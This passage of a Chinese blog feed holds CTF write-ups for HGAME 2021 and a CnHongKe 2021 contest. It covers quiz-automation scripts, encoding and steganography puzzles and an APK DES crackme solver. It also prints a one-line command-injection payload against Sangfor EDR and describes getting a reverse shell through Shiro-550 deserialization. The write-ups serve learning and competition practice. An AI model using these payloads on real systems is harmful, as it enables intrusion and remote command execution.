class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">                &lt;div class="alert alert-danger">\n                    &lt;strong>Wrong!&lt;/strong>\n                &lt;/div></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>应该是通过<code>./api/getStatus</code>检查做题情况，<code>./api/getQuestion</code>加载题目，<code>./api/verify</code>交答案，最后<code>./api/getFlag</code>拿flag</p><p>直接访问<code>./api/getFlag</code>看看？</p><img src="/article/hgame2021/image-20210206162746009.png" class="" title="image-20210206162746009" loading="lazy"><p>被骂了555…应该是检查session看做题情况，其他都访问一下看看</p><img src="/article/hgame2021/image-20210206162926231.png" class="" title="image-20210206162926231" loading="lazy"><img src="/article/hgame2021/image-20210206162952785.png" class="" title="image-20210206162952785" loading="lazy"><p>最后确认答案是<code>answer</code>，开始写脚本</p><img src="/article/hgame2021/image-20210206163154279.png" class="" title="image-20210206163154279" loading="lazy"><p>赶时间，没搞正则，凑合着用用吧，蹩脚编程勿喷2333</p><p>payload:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/1/30 21:20@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> sympy <span class="token keyword">import</span> symbols<span class="token punctuation">,</span> integrate<span class="token keyword">import</span> jsonurl <span class="token operator">=</span> <span class="token string">"http://r4u.top:5000"</span><span class="token comment"># print(requests.get(url))</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">jifen</span><span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    x <span class="token operator">=</span> symbols<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> integrate<span class="token punctuation">(</span>a <span class="token operator">*</span> x <span class="token operator">+</span> b<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> shangxian<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> A<span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#123;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\"question\":\"&lt;math>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/math>\"&#125;"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/json"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>            <span class="token string">'utf8'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getQuestion"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;mrow>"</span><span class="token punctuation">)</span>    <span class="token comment"># print(res)</span>    xiaxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(xiaxian)</span>    shangxian <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/msubsup>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                           <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(shangxian)</span>    a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mi>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(a)</span>    b <span class="token operator">=</span> <span class="token builtin">float</span><span class="token punctuation">(</span>        res<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mo>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;mn>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/mn>"</span><span class="token punctuation">,</span>                                                                                                                <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>            <span class="token string">"&lt;/mrow>"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># print(b)</span>    ans <span class="token operator">=</span> jifen<span class="token punctuation">(</span>shangxian<span class="token punctuation">,</span> xiaxian<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"answer"</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    upans <span class="token operator">=</span> req<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/verify"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>upans<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        run<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">"/api/getFlag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(session.cookies)</span></code></pre><p>一 键 获 取 flag</p><img src="/article/hgame2021/image-20210206163540205.png" class="" title="image-20210206163540205" loading="lazy"><hr><h3 id="走私者的愤怒"><a href="#走私者的愤怒" class="headerlink" title="走私者的愤怒"></a>走私者的愤怒</h3><p>题目描述：</p><p> <strong>本题为宝藏走私者的更改版本，考点相同，请先做出宝藏走私者</strong><br>Liki 日记：<br>2020年2月2日：<br>今天警局寄来一封信，是走私者 Switch 寄来的，信里只有一句话<br><strong>“我最讨厌顺风车，我将带来我的愤怒”</strong><br>真是让人摸不着头脑……<br>我看不懂，但我大受震撼。 </p><p>题目描述： <a href="http://police.liki.link/">http://police.liki.link</a> </p><p>原因是web3能上车了2333</p><p>相同payload，改改host就行</p><img src="/article/hgame2021/QQ%E5%9B%BE%E7%89%8720210206163759.png" class="" title="QQ图片20210206163759" loading="lazy"><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>misc随缘做做了，一周三场比赛有点忙</p><hr><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>题目描述：</p><p>新年即将来临之际，Base家族也团聚了，他们用他们特有的打招呼方式向你问了个好，你知道他们在说什么吗？ R1k0RE1OWldHRTNFSU5SVkc1QkRLTlpXR1VaVENOUlRHTVlETVJCV0dVMlVNTlpVR01ZREtSUlVIQTJET01aVUdSQ0RHTVpWSVlaVEVNWlFHTVpER01KWElRPT09PT09<br><strong>本次比赛为招新赛，请各位选手不要在当周比赛进行期间至结束后24小时内发布当周比赛题目的writeup</strong> </p><p>题目地址：<a href="https://www.baidu.com/">https://www.baidu.com</a> 很强啊</p><p>base64+base32+base16 不解释</p><hr><p>吐槽下MISC2</p><p>压缩包密码知道是啥嘛？</p><img src="/article/hgame2021/1.jpg" class="" width="1" loading="lazy"><p>23333没错就是的</p><p>misc3好像是流量包，能提出来一张几M的图片，分析图片</p><hr><h3 id="Word-RE-MASTER"><a href="#Word-RE-MASTER" class="headerlink" title="Word RE:MASTER"></a>Word RE:MASTER</h3><p>题目描述： timmix不知所踪，只留下了两个word文档，作为word专家的你能帮忙找出他的去向吗？ </p><p>题目链接：<a href="https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip">https://1.oss.hgame2021.vidar.club/Word_REMASTER_e3c365a2c0edb60fbb7152279a31dafd.zip</a></p><p>其实我以前出过一个Word的Misc，有人记得嘛2333</p><p>两个word文档，先看属性</p><img src="/article/hgame2021/image-20210206164905132.png" class="" title="image-20210206164905132" loading="lazy"><p>估计另一个有密码，直接以压缩包形式打开</p><p>很轻易有个<code>word/password.xml</code></p><img src="/article/hgame2021/image-20210206165015840.png" class="" title="image-20210206165015840" loading="lazy"><pre class="language-none"><code class="language-none">&lt;password&gt;+++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;-.++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-. +++.+ .++++ ++++. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. +.--- --..+ .++++ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----- .&lt;&lt;&#x2F;password&gt;</code></pre><p>很显然brainfuck</p><p>解密网站<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>解得<code>DOYOUKNOWHIDDEN?</code></p><p>开第二个文档，分析了一下什么都没有，文档只有一张图片</p><img src="/article/hgame2021/image-20210206165425076.png" class="" title="image-20210206165425076" loading="lazy"><p>选中文档发现不对劲，显示隐藏标记发现有隐藏字符，把字符取消隐藏</p><img src="/article/hgame2021/image-20210206170404252.png" class="" title="image-20210206170404252" loading="lazy"><p>发现是空白的，单独保存下来</p><img src="/article/hgame2021/image-20210206170505833.png" class="" title="image-20210206170505833" loading="lazy"><p>结合图片跟雪有关，可能是snow加密，去跑一下试试</p><img src="/article/hgame2021/image-20210206170631851.png" class="" title="image-20210206170631851" loading="lazy"><p>确实</p><hr><p>其他题目可以等官方或者PWN师傅的WP啦，每次做题不管简单还是困难都要有所收获，week2师傅们也要加油！提前祝师傅们新年快乐！</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CnHongKe2021公测赛</title>
      <link href="article/2021gongcesai/"/>
      <url>article/2021gongcesai/</url>
      
        <content type="html"><![CDATA[<p>2月5日</p><p>比赛情况：</p><img src="/article/2021gongcesai/image-20210205133228513.png" class="" title="rank" loading="lazy"><p>小比赛</p><span id="more"></span><img src="/article/2021gongcesai/image-20210205133840182.png" class="" title="rank" loading="lazy"><p>主办方平台关太快了2333，睡了一觉起来连平台都没了</p><h2 id="Sign"><a href="#Sign" class="headerlink" title="Sign"></a>Sign</h2><h3 id="Choice"><a href="#Choice" class="headerlink" title="Choice"></a>Choice</h3><p>PHP CGI解析漏洞出现的原因是（ ）</p><ul><li><p>A.cgi.fix_pathi配置错误</p></li><li><p>B.cgi.fix_pathinfo配置错误</p></li><li><p>C.phpinfo配置错误</p></li><li><p>D.cgi.fix__status_en配置错误</p></li></ul><p>很显然是<code>cgi.fix_pathinfo</code>配置错误，当设置了cgi.fix_pathinfo &#x3D; 1时，PHP就会以’&#x2F;‘为分割符从最后一个文件开始向前找存在的文件去执行，例如<code>/upload/a.jpg/b.php</code>.</p><hr><h3 id="扭转乾坤"><a href="#扭转乾坤" class="headerlink" title="扭转乾坤"></a>扭转乾坤</h3><p>扫码得flag</p><img src="/article/2021gongcesai/image-20210205172001695.png" class="" title="image-20210205172001695" loading="lazy"><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>深信服载入史册</p><p>直接payload打</p><img src="/article/2021gongcesai/image-20210205134031474.png" class="" title="image-20210205134031474" loading="lazy"><p>Payload:</p><pre class="language-none"><code class="language-none">.&#x2F;?strip_slashes&#x3D;system&amp;host&#x3D;cat &#x2F;flag</code></pre><p>这题去年有过，是作为线下赛的题目，当时没外网，只能硬审，或者…<del>记得payload</del>，毕竟太有名了…</p><hr><h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><p>Shiro remeberMe反序列化漏洞（Shiro-550）</p><p>用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞</p><img src="/article/2021gongcesai/image-20210205135031033.png" class="" title="image-20210205135031033" loading="lazy"><p>可以如 <a href="https://www.cnblogs.com/sup3rman/archive/2020/07/16/13322898.html">参考文章</a> 所示，利用<code>shiro.py</code>生成payload</p><img src="/article/2021gongcesai/image-20210205135241419.png" class="" title="image-20210205135241419" loading="lazy"><p>当然后来才发现更简单的，直接用 <code>ShiroScan</code> 工具，可以用DNSlog的方式，也可以反弹shell，这里直接反弹shell</p><img src="/article/2021gongcesai/image-20210205135442119.png" class="" title="image-20210205135442119" loading="lazy"><p>成功弹到shell</p><img src="/article/2021gongcesai/image-20210205135511988.png" class="" title="image-20210205135511988" loading="lazy"><hr><h3 id="fast-x-3"><a href="#fast-x-3" class="headerlink" title="fast x 3"></a>fast x 3</h3><p>老脚本大师了</p><img src="/article/2021gongcesai/image-20210205135615967.png" class="" title="image-20210205135615967" loading="lazy"><p>写个py脚本即可，直接上payload，蹩脚编程，师傅们见谅…</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token triple-quoted-string string">"""@Time ： 2021/2/5 9:22@Auth ： gyy@Blog ：http://err0r.top"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> collectionsurl <span class="token operator">=</span> <span class="token string">"http://180.109.90.207:23891/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"submit"</span><span class="token punctuation">:</span> <span class="token string">"提交"</span><span class="token punctuation">&#125;</span>responses <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>responses<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"1--------------------------------取字符串"</span><span class="token punctuation">)</span>cal <span class="token operator">=</span> responses<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;/b>'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;divid=\"math\">"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>cal<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"2--------------------------------计数"</span><span class="token punctuation">)</span><span class="token builtin">str</span> <span class="token operator">=</span> collections<span class="token punctuation">.</span>Counter<span class="token punctuation">(</span>cal<span class="token punctuation">)</span>str1 <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"3--------------------------------排序"</span><span class="token punctuation">)</span><span class="token keyword">from</span> collections <span class="token keyword">import</span> OrderedDictstr2 <span class="token operator">=</span> OrderedDict<span class="token punctuation">(</span><span class="token builtin">sorted</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"4--------------------------------取key"</span><span class="token punctuation">)</span>val <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> str2<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    val <span class="token operator">+=</span> ival <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"5--------------------------------赋data"</span><span class="token punctuation">)</span>data<span class="token punctuation">[</span><span class="token string">'res'</span><span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"6--------------------------------提交"</span><span class="token punctuation">)</span>post_responses <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_responses<span class="token punctuation">)</span></code></pre><p>编编改改凑合用</p><img src="/article/2021gongcesai/image-20210205140020576.png" class="" title="image-20210205140020576" loading="lazy"><hr><h2 id="Apk"><a href="#Apk" class="headerlink" title="Apk"></a>Apk</h2><h3 id="Des"><a href="#Des" class="headerlink" title="Des"></a>Des</h3><p>2015ISCC的题目改题<code>没有题目的题目</code></p><p>主要代码</p><pre class="language-none"><code class="language-none">public boolean check() &#123;     byte[] b2 &#x3D; &#123;103, 112, 111, 49, 61, 113, 117, 109, 76, 108, 77, 57, 59, 90, 64, 105, 33, 89, 74, 113, 92, 84, 87, 113, 105, 65, 35, 74, 93, 73, 43, 120&#125;;     byte[] b3 &#x3D; this.result1.getBytes();     for (int j &#x3D; 0; j &lt; b3.length; j++) &#123;         Log.d(&quot;test&quot;, ((byte) (b3[j] ^ j)));     &#125;     if (b3.length !&#x3D; b2.length) &#123;         return false;     &#125;     for (int j2 &#x3D; 0; j2 &lt; b2.length; j2++) &#123;         if ((b3[j2] ^ b2[j2]) !&#x3D; j2) &#123;             return false;         &#125;     &#125;     return true; &#125;</code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pyDes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> base64V0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">DeCheck</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    v1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        v1<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>    xx <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>v1<span class="token punctuation">)</span>    <span class="token comment">##print xx</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>xx<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'ilovedes'</span>    iv <span class="token operator">=</span> <span class="token string">'\x01\x02\x03\x04\x05\x06\x07\x08'</span>    k <span class="token operator">=</span> des<span class="token punctuation">(</span>key<span class="token punctuation">,</span> CBC<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> pad<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> padmode<span class="token operator">=</span>PAD_PKCS5<span class="token punctuation">)</span>    flag <span class="token operator">=</span> k<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>DeCheck<span class="token punctuation">(</span>V0<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Your flag is: "</span> <span class="token operator">+</span> flag</code></pre><img src="/article/2021gongcesai/image-20210205140432528.png" class="" title="image-20210205140432528" loading="lazy"><img 